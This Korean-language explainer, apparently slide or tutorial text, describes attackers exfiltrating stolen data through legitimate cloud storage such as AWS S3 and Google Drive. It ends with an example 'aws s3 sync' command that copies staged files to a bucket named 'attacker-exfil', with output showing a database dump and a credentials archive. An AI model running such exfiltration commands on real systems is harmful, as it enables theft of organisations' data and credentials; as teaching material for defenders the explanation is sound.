합법적 클라우드 서비스를 통한 대규모 데이터 유출

#1. 클라우드 유출이란?

📁 ➜ ☁️ ➜ 🔓 ➜ 💀

"합법적 클라우드를 통한 은밀한 데이터 유출"

공격자는 탈취한 데이터를 AWS S3, Azure Blob, Google Drive 등 합법적 클라우드 스토리지로 전송합니다. 이 트래픽은 정상적인 클라우드 사용과 구분하기 어려우며, HTTPS로 암호화되어 내용 검사도 곤란합니다.

왜 클라우드인가?

클라우드 스토리지는 대용량 전송이 정상적이고, HTTPS 암호화가 기본이며, 기업에서도 널리 사용하므로 차단이 어렵습니다.

#2. 클라우드 서비스 악용 방법

AWS S3 악용

공격자의 AWS 계정에 S3 버킷을 생성하고 aws s3 cp로 대량 파일을 전송합니다. 정상적인 AWS API 호출로 위장됩니다.

Google Drive / OneDrive

OAuth 토큰으로 개인 Google Drive에 API를 통해 업로드합니다. 기업의 Google Workspace 트래픽과 혼재되어 탐지가 어렵습니다.

실전: AWS CLI 대량 유출

침해된 서버에서 AWS CLI로 수집 데이터를 자신의 S3 버킷으로 전송합니다.

# 공격자 S3 버킷으로 유출
aws s3 sync /tmp/staged/ s3://attacker-exfil/loot/
upload: db_dump.sql.gz (2.3 GB)
upload: credentials.zip (45 MB)
